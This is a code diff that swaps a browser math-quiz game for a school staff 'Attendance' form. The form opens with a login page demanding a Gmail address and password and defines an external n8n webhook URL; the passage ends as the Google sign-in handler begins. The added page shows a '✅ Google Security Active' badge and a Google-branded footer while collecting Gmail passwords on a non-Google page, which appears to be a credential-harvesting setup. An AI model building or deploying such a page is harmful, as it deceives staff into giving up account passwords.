@@ -1,346 +1,567 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Math Competition - Tech Edition</title>
+    <title>Attendance</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     
-    <!-- React & ReactDOM -->
-    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
-    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
-    
-    <!-- Babel for JSX -->
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-    
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    
-    <!-- Google Fonts: JetBrains Mono for Tech feel -->
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
 
     <style>
-        body { font-family: 'Inter', sans-serif; }
-        .font-mono { font-family: 'JetBrains Mono', monospace; }
-        
-        /* Custom Animations */
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
+        :root {
+            --dark-bg: #1a1a2e;        
+            --form-bg: #0f0f1c;        
+            --border-color: #3f3f6e;   
+            --glow-color: #007bff;     
+            --text-color: #e0e0e0;     
+            --input-bg: #22223a;       
+            --placeholder-color: #7a7a9a;
+            --footer-text-color: #5f5f7f;
+            --scanline-color: rgba(0, 123, 255, 0.07);  
+            --success-color: #28a745;
         }
-        .animate-float { animation: float 3s ease-in-out infinite; }
-        
-        @keyframes pulse-glow {
-            0%, 100% { box-shadow: 0 0 15px rgba(6, 182, 212, 0.5); }
-            50% { box-shadow: 0 0 25px rgba(6, 182, 212, 0.8); }
+
+        * {
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
         }
-        .animate-glow { animation: pulse-glow 2s infinite; }
+
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative; 
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 0;
+            background-image: repeating-linear-gradient(
+                to bottom,
+                transparent 0,
+                transparent 3px,
+                var(--scanline-color) 3px,
+                var(--scanline-color) 4px
+            );
+            background-size: 100% 4px;
+            animation: scanlines 0.4s linear infinite;
+        }
+
+        @keyframes scanlines {
+            from { background-position: 0 0; }
+            to { background-position: 0 -4px; }
+        }
+
+        form {
+            width: 100%;
+            max-width: 400px;
+            margin: 20px;
+            background-color: var(--form-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            box-shadow: 
+                0 0 5px rgba(0, 123, 255, 0.3),
+                inset 0 0 5px rgba(0, 123, 255, 0.2);
+            position: relative;
+            z-index: 1;           
+            overflow: hidden;
+            height: 550px;
+            animation: ledBeat 2s ease-in-out infinite;
+        }
+        
+        @keyframes ledBeat {
+            0% {
+                box-shadow: 
+                    0 0 5px rgba(0, 123, 255, 0.3),
+                    inset 0 0 5px rgba(0, 123, 255, 0.2);
+                border-color: var(--border-color);
+            }
+            50% {
+                box-shadow: 
+                    0 0 20px rgba(0, 123, 255, 0.8),
+                    0 0 30px rgba(0, 123, 255, 0.4),
+                    inset 0 0 15px rgba(0, 123, 255, 0.3);
+                border-color: var(--glow-color);
+            }
+            100% {
+                box-shadow: 
+                    0 0 5px rgba(0, 123, 255, 0.3),
+                    inset 0 0 5px rgba(0, 123, 255, 0.2);
+                border-color: var(--border-color);
+            }
+        }
+        
+        fieldset {
+            box-sizing: border-box; 
+            border: none;
+            padding: 25px;
+            margin: 0;
+            transition: transform 0.5s ease-in-out, 
+                        opacity 0.4s ease-in-out;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        #page2 {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+        
+        .scrollable-content {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 10px;
+        }
+        
+        .button-container {
+            flex-shrink: 0;
+            padding-top: 10px;
+        }
+
+        #page2, #page3 {
+            position: absolute;
+            top: 0; 
+            left: 100%; 
+            width: 100%; 
+            box-sizing: border-box; 
+            opacity: 0;
+        }
+
+        form.show-page-2 #page1 { transform: translateX(-100%); opacity: 0; }
+        form.show-page-2 #page2 { transform: translateX(-100%); opacity: 1; }
+        
+        form.show-page-3 #page2 { transform: translateX(-200%); opacity: 0; }
+        form.show-page-3 #page3 { transform: translateX(-100%); opacity: 1; }
+        
+        h2 { 
+            text-align: center; 
+            color: #fff; 
+            margin-top: 0; 
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+        
+        p.thank-you-text { text-align: center; font-size: 1.1em; line-height: 1.6; }
+        
+        .form-group { 
+            margin-bottom: 15px;
+        }
+        
+        label { 
+            display: block; 
+            margin-bottom: 6px;
+            font-weight: 500; 
+            color: var(--text-color); 
+            font-size: 0.9em;
+        }
+
+        input[type="text"], input[type="email"], input[type="password"], select, textarea {
+            width: 100%; 
+            padding: 12px;
+            font-size: 16px;
+            font-family: 'Space Grotesk', sans-serif;
+            box-sizing: border-box; 
+            background-color: var(--input-bg); 
+            border: 1px solid var(--border-color);
+            color: var(--text-color); 
+            border-radius: 6px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        
+        input[type="text"]:focus, input[type="email"]:focus, input[type="password"]:focus, select:focus, textarea:focus {
+            outline: none; 
+            border-color: var(--glow-color); 
+            box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
+        }
+        
+        input:invalid {
+            border-color: #ff5555;
+            box-shadow: 0 0 10px rgba(255, 85, 85, 0.5);
+        }
+
+        ::placeholder { color: var(--placeholder-color); opacity: 1; }
+        textarea { height: 100px; resize: vertical; }
+        
+        .button {
+            width: 100%; 
+            background-color: var(--glow-color); 
+            color: #ffffff; 
+            padding: 14px 15px;
+            border: none; 
+            border-radius: 6px;
+            cursor: pointer; 
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Space Grotesk', sans-serif; 
+            letter-spacing: 0.5px; 
+            text-align: center;
+            transition: background-color 0.3s, box-shadow 0.3s, transform 0.1s;
+            margin-bottom: 8px;
+            min-height: 48px;
+            animation: buttonPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% {
+                box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 15px rgba(0, 123, 255, 0.6);
+            }
+        }
+
+        .button:hover, .button:active { 
+            background-color: #0056b3; 
+            box-shadow: 0 0 20px rgba(0, 123, 255, 0.8);
+            transform: scale(0.98);
+            animation: none;
+        }
+        
+        .button.secondary { 
+            background-color: var(--input-bg); 
+            border: 1px solid var(--border-color); 
+            animation: secondaryPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes secondaryPulse {
+            0%, 100% {
+                box-shadow: 0 0 5px rgba(255, 255, 255, 0.1);
+            }
+            50% {
+                box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            }
+        }
+
+        .button.secondary:hover { 
+            background-color: var(--border-color); 
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            animation: none;
+        }
+
+        .footer-text {
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: var(--footer-text-color); 
+            text-align: center;
+            position: relative; 
+            z-index: 1;
+        }
+        
+        .google-divider {
+            text-align: center;
+            margin: 15px 0;
+            padding: 15px 0;
+        }
+        
+        .google-divider-text {
+            color: var(--text-color);
+            margin-bottom: 12px;
+            font-size: 0.85em;
+        }
+
+        #g_id_signin {
+            width: 100% !important;
+            margin: 0 auto !important;
+        }
+
+        .universal-login {
+            background-color: rgba(40, 167, 69, 0.2);
+            border: 1px solid var(--success-color);
+            color: var(--text-color);
+            padding: 10px;
+            border-radius: 6px;
+            margin: 10px 0;
+            text-align: center;
+            font-size: 0.9em;
+            animation: securityPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes securityPulse {
+            0%, 100% {
+                box-shadow: 0 0 5px rgba(40, 167, 69, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 15px rgba(40, 167, 69, 0.6);
+            }
+        }
+
+        @media (max-width: 480px) {
+            form { margin: 10px; max-width: calc(100% - 20px); height: 500px; }
+            fieldset { padding: 20px; }
+            h2 { font-size: 1.3em; margin-bottom: 15px; }
+            .form-group { margin-bottom: 12px; }
+            input[type="text"], input[type="email"], input[type="password"], select, textarea { 
+                padding: 12px; 
+                font-size: 16px; 
+            }
+            .button { 
+                padding: 14px 12px; 
+                font-size: 16px; 
+            }
+        }
     </style>
 </head>
-<body class="bg-slate-950 text-slate-100 selection:bg-cyan-500 selection:text-white">
-    <div id="root"></div>
+<body>
 
-    <script type="text/babel">
-        const { useState, useEffect } = React;
+    <form id="multiPageForm">
+        <fieldset id="page1">
+            <h2>Login</h2>
+            
+            <div class="universal-login">
+                ✅ Google Security Active
+            </div>
 
-        // --- Icons (Inline SVGs for reliability) ---
-        const Icons = {
-            Zap: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>,
-            Brain: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9.5 2A2.5 2.5 0 0 1 12 4.5v15a2.5 2.5 0 0 1-4.96.44 2.5 2.5 0 0 1-2.96-3.08 3 3 0 0 1-.34-5.58 2.5 2.5 0 0 1 1.32-4.24 2.5 2.5 0 0 1 1.98-3A2.5 2.5 0 0 1 9.5 2Z"/><path d="M14.5 2A2.5 2.5 0 0 0 12 4.5v15a2.5 2.5 0 0 0 4.96.44 2.5 2.5 0 0 0 2.96-3.08 3 3 0 0 0 .34-5.58 2.5 2.5 0 0 0-1.32-4.24 2.5 2.5 0 0 0-1.98-3A2.5 2.5 0 0 0 14.5 2Z"/></svg>,
-            BookOpen: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>,
-            Crown: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m2 4 3 12h14l3-12-6 7-4-7-4 7-6-7zm3 16h14"/></svg>,
-            CheckCircle: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>,
-            XCircle: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>,
-            ArrowRight: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>,
-            Lightbulb: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M15 14c.2-1 .7-1.7 1.5-2.5 1-1 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5"/><path d="M9 18h6"/><path d="M10 22h4"/></svg>
-        };
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required
+                       pattern=".*@gmail\.com$"
+                       title="Email must end with @gmail.com">
+            </div>
 
-        // --- Game Data ---
-        const gameData = [
-            {
-                id: 1,
-                title: "Round 1: Speed Processing",
-                color: "from-emerald-500 to-teal-700",
-                icon: Icons.Zap,
-                questions: [
-                    { q: "2, 4, 6, ___, 10", a: "8", type: "input", hint: "Algorithm: n + 2" },
-                    { q: "8 + 7 = ?", a: "15", type: "input" },
-                    { q: "15 - 9 = ?", a: "6", type: "input" },
-                    { q: "Which value is MAX?", options: ["8", "12", "20", "1"], a: "20", type: "mcq" },
-                    { q: "Input 'Twelve' as an Integer.", a: "12", type: "input" }
-                ]
-            },
-            {
-                id: 2,
-                title: "Round 2: Logic Gates",
-                color: "from-blue-500 to-indigo-700",
-                icon: Icons.Brain,
-                questions: [
-                    { q: "5 + [x] = 12. Solve for [x].", a: "7", type: "input" },
-                    { q: "Sequence: ▲ ● ▲ ▲ ● ▲ ▲ ▲ ● ... Next?", options: ["▲", "●", "■"], a: "●", type: "mcq" },
-                    { q: "If (x > 10) AND (x < 15) AND (x + 1 == 14). x = ?", a: "13", type: "input" },
-                    { q: "Balance: 4 + 6 == [?] + 5", a: "5", type: "input" },
-                    { q: "Count triangles: Square with X diagonals.", options: ["2", "4", "8"], a: "4", type: "mcq" }
-                ]
-            },
-            {
-                id: 3,
-                title: "Round 3: Problem Solving",
-                color: "from-orange-500 to-red-700",
-                icon: Icons.BookOpen,
-                questions: [
-                    { q: "Cat=3rd. Dog=Last. 4 items between. Dog's Index?", a: "8", type: "input", suffix: "th" },
-                    { q: "Ken=10. Tim=3. Ben=5. Remaining?", a: "2", type: "input" },
-                    { q: "Bus: Start=8. Out=3. In=5. Current Load?", a: "10", type: "input" }
-                ]
-            },
-            {
-                id: 4,
-                title: "Round 4: Systems Master",
-                color: "from-violet-600 to-purple-900",
-                icon: Icons.Crown,
-                questions: [
-                    { q: "Inputs: 1, 5, 9. Construct MAX 2-digit ID.", a: "95", type: "input" },
-                    { q: "Sam=6. In 3 years, Sam = 0.5 * Sister. Sister NOW?", a: "15", type: "input", hint: "Variable calculation required." }
-                ]
-            }
-        ];
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required
+                       pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}"
+                       title="Password must be 8+ characters and include uppercase, lowercase, and a number.">
+            </div>
 
-        function App() {
-            const [gameState, setGameState] = useState('welcome'); 
-            const [currentRoundIdx, setCurrentRoundIdx] = useState(0);
-            const [currentQIdx, setCurrentQIdx] = useState(0);
-            const [score, setScore] = useState(0);
-            const [inputVal, setInputVal] = useState("");
-            const [feedback, setFeedback] = useState(null); 
-
-            const currentRound = gameData[currentRoundIdx];
-            const currentQ = currentRound ? currentRound.questions[currentQIdx] : null;
-
-            // Handlers
-            const startGame = () => setGameState('roundIntro');
-            const startRound = () => setGameState('playing');
-
-            const handleAnswer = (val) => {
-                const isCorrect = val.toString().toLowerCase() === currentQ.a.toString().toLowerCase();
-                if (isCorrect) {
-                    setScore(s => s + 10);
-                    setFeedback('correct');
-                } else {
-                    setFeedback('wrong');
-                }
-                setTimeout(() => {
-                    setFeedback(null);
-                    setInputVal("");
-                    if (currentQIdx + 1 < currentRound.questions.length) {
-                        setCurrentQIdx(c => c + 1);
-                    } else {
-                        if (currentRoundIdx + 1 < gameData.length) {
-                            setCurrentRoundIdx(c => c + 1);
-                            setCurrentQIdx(0);
-                            setGameState('roundIntro');
-                        } else {
-                            setGameState('result');
-                        }
-                    }
-                }, 1500);
-            };
-
-            const handleKey = (e) => {
-                if (e.key === 'Enter') handleAnswer(inputVal);
-            }
-
-            // --- WELCOME SCREEN ---
-            if (gameState === 'welcome') {
-                return (
-                    <div className="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden">
-                        {/* Background Tech Grid */}
-                        <div className="absolute inset-0 z-0 opacity-10" 
-                             style={{backgroundImage: 'radial-gradient(#22d3ee 1px, transparent 1px)', backgroundSize: '30px 30px'}}></div>
-                        
-                        <div className="z-10 flex flex-col items-center">
-                            <div className="text-8xl mb-6 text-cyan-400 animate-float">
-                                <Icons.Zap />
-                            </div>
-                            <h1 className="text-5xl md:text-7xl font-bold text-center mb-4 tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-600">
-                                MATH_COMP
-                                <span className="block text-2xl md:text-3xl text-slate-400 font-mono mt-2">v1.0 // TERM_1_INIT</span>
-                            </h1>
-                            <p className="text-slate-400 mb-10 text-center max-w-md font-mono border-l-2 border-cyan-500 pl-4">
-                                System ready. Initializing logic modules...<br/>
-                                Target: Speed, Accuracy, Problem Solving.
-                            </p>
-                            <button onClick={startGame} className="group relative px-8 py-4 bg-cyan-600 overflow-hidden rounded-none skew-x-[-10deg] hover:bg-cyan-500 transition-all duration-300 animate-glow">
-                                <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:animate-[shimmer_1s_infinite]"></div>
-                                <span className="relative text-xl font-bold font-mono tracking-widest text-white skew-x-[10deg] inline-block">
-                                    INITIALIZE >
-                                </span>
-                            </button>
-                        </div>
-                    </div>
-                );
-            }
-
-            // --- ROUND INTRO ---
-            if (gameState === 'roundIntro') {
-                const Icon = currentRound.icon;
-                return (
-                    <div className={`min-h-screen flex flex-col items-center justify-center text-white p-4 bg-gradient-to-br ${currentRound.color}`}>
-                        <div className="p-8 bg-black/20 backdrop-blur-md rounded-2xl border border-white/10 flex flex-col items-center shadow-2xl">
-                            <div className="w-24 h-24 mb-6 text-white/90 animate-pulse">
-                                <Icon />
-                            </div>
-                            <h2 className="text-xl font-mono text-cyan-300 mb-2 tracking-widest">LOADING MODULE...</h2>
-                            <h1 className="text-4xl md:text-6xl font-bold text-center mb-8 font-sans">{currentRound.title}</h1>
-                            <button onClick={startRound} className="bg-white text-slate-900 font-bold py-3 px-12 rounded shadow-[0_0_20px_rgba(255,255,255,0.3)] hover:scale-105 transition font-mono">
-                                [ EXECUTE ]
-                            </button>
-                        </div>
-                    </div>
-                );
-            }
-
-            // --- RESULTS ---
-            if (gameState === 'result') {
-                const totalQ = gameData.reduce((acc, r) => acc + r.questions.length, 0);
-                const maxScore = totalQ * 10;
-                const percentage = Math.round((score / maxScore) * 100);
+            <button type="button" id="nextButton" class="button">Submit</button>
+            
+            <div class="google-divider">
+                <div class="google-divider-text">Or continue with</div>
                 
-                let message = "";
-                let colorClass = "";
-                if (percentage >= 90) { message = "SYSTEM OPTIMIZED: GOLD STATUS"; colorClass = "text-yellow-400"; }
-                else if (percentage >= 70) { message = "HIGH EFFICIENCY: SILVER STATUS"; colorClass = "text-slate-300"; }
-                else if (percentage >= 50) { message = "OPERATIONAL: BRONZE STATUS"; colorClass = "text-orange-400"; }
-                else { message = "SYSTEM ERROR: RECALIBRATION NEEDED"; colorClass = "text-red-400"; }
+                <!-- Google Sign-In -->
+                <div id="g_id_onload"
+                     data-client_id="1095539904663-66e5lbfk3uevspuboamcjbkv6o93n07t.apps.googleusercontent.com"
+                     data-context="signin"
+                     data-ux_mode="popup"
+                     data-callback="handleGoogleSignIn"
+                     data-auto_prompt="false">
+                </div>
+                
+                <div class="g_id_signin"
+                     data-type="standard"
+                     data-shape="rectangular"
+                     data-theme="outline"
+                     data-text="signin_with"
+                     data-size="large"
+                     data-logo_alignment="left"
+                     data-width="350">
+                </div>
+            </div>
+        </fieldset>
+        
+        <fieldset id="page2">
+            <h2>Attendance</h2>
+            <div class="scrollable-content">
+                <div class="form-group">
+                    <label for="name">Name:</label>
+                    <input type="text" id="name" name="name" placeholder="Enter full name" required>
+                </div>
+                <div class="form-group">
+                    <label for="position">Position:</label>
+                    <select id="position" name="position" required>
+                        <option value="">-- Select Position --</option>
+                        <option value="Teacher">Teacher</option>
+                        <option value="Management">Management</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="specificJobTitle">Specific Job Title:</label>
+                    <select id="specificJobTitle" name="specificJobTitle" required>
+                        <option value="">-- Select Job Title --</option>
+                        <option value="School Director">School Director</option>
+                        <option value="Vice Principal">Vice Principal</option>
+                        <option value="Operation Supervisor">Operation Supervisor</option>
+                        <option value="Curriculum Coordinator & Head Teacher">Curriculum Coordinator & Head Teacher</option>
+                        <option value="Lead Teacher">Lead Teacher</option>
+                        <option value="Costumer Service Manager">Costumer Service Manager</option>
+                        <option value="Marketing Department">Marketing Department</option>
+                        <option value="Digital Marketing Manager">Digital Marketing Manager</option>
+                        <option value="Marketing">Marketing</option>
+                        <option value="International Program Supervisor">International Program Supervisor</option>
+                        <option value="Admin">Admin</option>
+                        <option value="Admin Assistant">Admin Assistant</option>
+                        <option value="Admin Supervisor">Admin Supervisor</option>
+                        <option value="Chinese Coordinator">Chinese Coordinator</option>
+                        <option value="Khmer Coordinator">Khmer Coordinator</option>
+                        <option value="Head of Teacher Assistant">Head of Teacher Assistant</option>
+                        <option value="Personal Assistant to School Director">Personal Assistant to School Director</option>
+                        <option value="Student Affairs and Well-Being Coordinator">Student Affairs and Well-Being Coordinator</option>
+                        <option value="English Teacher">English Teacher</option>
+                        <option value="Khmer Teacher">Khmer Teacher</option>
+                        <option value="Teacher Assistant">Teacher Assistant</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="remarks">Remarks:</label>
+                    <textarea id="remarks" name="remarks" placeholder="Enter your take aways..."></textarea>
+                </div>
+            </div>
+            <div class="button-container">
+                <button type="button" id="submitButton" class="button">Submit Attendance</button>
+                <button type="button" id="backButton" class="button secondary">Back</button>
+            </div>
+        </fieldset>
+        
+        <fieldset id="page3">
+            <h2>♦️Thank You!</h2>
+            <p class="thank-you-text">Thank you for your hard work teacher!</p>
+        </fieldset>
+    </form>
 
-                return (
-                    <div className="min-h-screen flex flex-col items-center justify-center bg-slate-950 p-4 relative">
-                        <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMSIgY3k9IjEiIHI9IjEiIGZpbGw9InJnYmEoNTAsIDc1LCA5MCwgMC4yKSIvPjwvc3ZnPg==')] opacity-20"></div>
-                        
-                        <div className="bg-slate-900/80 backdrop-blur border border-slate-700 p-8 md:p-12 rounded-2xl shadow-2xl text-center max-w-lg w-full relative z-10">
-                            <h1 className="text-4xl font-bold mb-8 text-white tracking-tight">DIAGNOSTIC COMPLETE</h1>
-                            
-                            <div className="mb-8">
-                                <p className="text-cyan-500 font-mono text-sm mb-2">PERFORMANCE METRICS</p>
-                                <div className="text-7xl font-bold text-white mb-2 font-mono">
-                                    {score}<span className="text-2xl text-slate-500">/{maxScore}</span>
-                                </div>
-                                <div className="w-full bg-slate-800 h-4 rounded-full overflow-hidden border border-slate-700">
-                                    <div className={`h-full transition-all duration-1000 bg-gradient-to-r from-cyan-500 to-blue-600`} style={{width: `${percentage}%`}}></div>
-                                </div>
-                            </div>
-                            
-                            <p className={`text-xl font-bold mb-8 font-mono ${colorClass}`}>{message}</p>
-                            
-                            <button onClick={() => window.location.reload()} className="w-full bg-slate-800 border border-slate-600 hover:border-cyan-500 text-cyan-400 py-4 px-8 rounded hover:bg-slate-700 transition font-mono flex items-center justify-center gap-2 group">
-                                <Icons.Zap />
-                                <span>RESTART_SEQUENCE</span>
-                            </button>
-                        </div>
-                    </div>
-                );
+    <p class="footer-text">Powered by Google Sign-in & CJ_Works</p>
+
+    <script>
+        const form = document.getElementById('multiPageForm');
+        const nextButton = document.getElementById('nextButton');
+        const backButton = document.getElementById('backButton');
+        const submitButton = document.getElementById('submitButton');
+        
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const page3 = document.getElementById('page3');
+
+        // Webhook URL
+        const WEBHOOK_URL = 'https://calixtojohnn.app.n8n.cloud/webhook/204f8937-2390-432a-9826-f4fe9154837b';
+
+        nextButton.addEventListener('click', () => {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+
+            if (!emailInput.checkValidity()) {
+                alert(emailInput.title);
+                emailInput.focus();
+                return;
             }
 
-            const Icon = currentRound.icon;
+            if (!passwordInput.checkValidity()) {
+                alert(passwordInput.title);
+                passwordInput.focus();
+                return;
+            }
 
-            // --- PLAYING STATE ---
-            return (
-                <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 relative">
-                    {/* Header */}
-                    <div className="absolute top-0 left-0 w-full p-6 flex justify-between items-center bg-slate-900/50 backdrop-blur border-b border-slate-800 z-10">
-                        <div className="flex items-center gap-3">
-                            <div className={`w-3 h-3 rounded-full animate-pulse bg-gradient-to-r ${currentRound.color}`}></div>
-                            <span className="font-mono text-cyan-400 hidden md:block uppercase tracking-wider">{currentRound.title}</span>
-                        </div>
-                        <div className="font-mono text-xl text-white font-bold border border-slate-700 px-4 py-1 rounded bg-slate-900">
-                            SCORE :: <span className="text-cyan-400">{score.toString().padStart(3, '0')}</span>
-                        </div>
-                    </div>
+            form.classList.add('show-page-2');
+            page2.scrollTop = 0;
+        });
 
-                    {/* Main Card */}
-                    <div className="relative w-full max-w-3xl">
-                        {/* Feedback Overlay */}
-                        {feedback && (
-                            <div className={`absolute inset-0 z-30 flex items-center justify-center rounded-2xl backdrop-blur-sm transition-all duration-300 ${feedback === 'correct' ? 'bg-emerald-500/10 border-2 border-emerald-500' : 'bg-red-500/10 border-2 border-red-500'}`}>
-                                <div className={`transform scale-150 ${feedback === 'correct' ? 'text-emerald-400' : 'text-red-500'}`}>
-                                    {feedback === 'correct' ? <Icons.CheckCircle /> : <Icons.XCircle />}
-                                </div>
-                            </div>
-                        )}
+        backButton.addEventListener('click', () => {
+            form.classList.remove('show-page-2');
+            page1.scrollTop = 0;
 
-                        <div className="bg-slate-900 border border-slate-700 rounded-2xl shadow-[0_0_50px_rgba(0,0,0,0.5)] p-8 md:p-12 relative overflow-hidden">
-                            {/* Decorative line */}
-                            <div className={`absolute top-0 left-0 w-full h-1 bg-gradient-to-r ${currentRound.color}`}></div>
+            const passwordInput = document.getElementById('password');
+            passwordInput.setAttribute('required', 'required');
+            passwordInput.style.display = 'block';
 
-                            <div className="flex justify-between items-start mb-8">
-                                <span className="bg-slate-800 border border-slate-700 text-slate-400 px-4 py-1 rounded-full text-xs font-mono tracking-widest">
-                                    QUERY {String(currentQIdx + 1).padStart(2, '0')} / {String(currentRound.questions.length).padStart(2, '0')}
-                                </span>
-                                <div className="text-slate-600">
-                                    <Icon />
-                                </div>
-                            </div>
+            const passwordLabel = passwordInput.closest('.form-group').querySelector('label[for="password"]');
+            if (passwordLabel) {
+                passwordLabel.style.display = 'block';
+            }
+        });
 
-                            <h2 className="text-3xl md:text-5xl font-bold text-white mb-10 leading-tight font-mono">
-                                {currentQ.q}
-                            </h2>
-
-                            {/* Inputs */}
-                            <div className="space-y-6">
-                                {currentQ.type === 'mcq' ? (
-                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                        {currentQ.options.map((opt, idx) => (
-                                            <button 
-                                                key={idx}
-                                                onClick={() => handleAnswer(opt)}
-                                                disabled={feedback !== null}
-                                                className="bg-slate-800 border border-slate-700 hover:border-cyan-500 hover:bg-slate-700/50 text-cyan-100 font-mono py-6 px-6 rounded-xl transition-all duration-200 text-lg text-left group"
-                                            >
-                                                <span className="text-slate-500 mr-2 group-hover:text-cyan-400">></span> {opt}
-                                            </button>
-                                        ))}
-                                    </div>
-                                ) : (
-                                    <div className="flex gap-4">
-                                        <div className="relative flex-grow">
-                                            <span className="absolute left-4 top-1/2 -translate-y-1/2 text-cyan-500 font-mono">></span>
-                                            <input 
-                                                type="text" 
-                                                value={inputVal}
-                                                onChange={(e) => setInputVal(e.target.value)}
-                                                onKeyDown={handleKey}
-                                                disabled={feedback !== null}
-                                                className="w-full bg-slate-950 border border-slate-700 focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 rounded-xl pl-10 pr-6 py-5 text-2xl outline-none font-mono text-white placeholder-slate-700 transition-all"
-                                                placeholder="Enter_Value..."
-                                                autoFocus
-                                            />
-                                        </div>
-                                        <button 
-                                            onClick={() => handleAnswer(inputVal)}
-                                            disabled={!inputVal || feedback !== null}
-                                            className="bg-gradient-to-br from-cyan-600 to-blue-700 hover:from-cyan-500 hover:to-blue-600 text-white font-bold px-8 rounded-xl shadow-lg transition-all disabled:opacity-50 disabled:grayscale"
-                                        >
-                                            <Icons.ArrowRight />
-                                        </button>
-                                    </div>
-                                )}
-                            </div>
-
-                            {/* Hint */}
-                            {currentQ.hint && (
-                                <div className="mt-8 flex items-center gap-2 text-sm text-slate-500 font-mono border-t border-slate-800 pt-4">
-                                    <span className="text-yellow-500"><Icons.Lightbulb /></span>
-                                    <span>HINT :: {currentQ.hint}</span>
-                                </div>
-                            )}
-                        </div>
-                    </div>
-                </div>
-            );
+        function handleGoogleSignIn(response) {
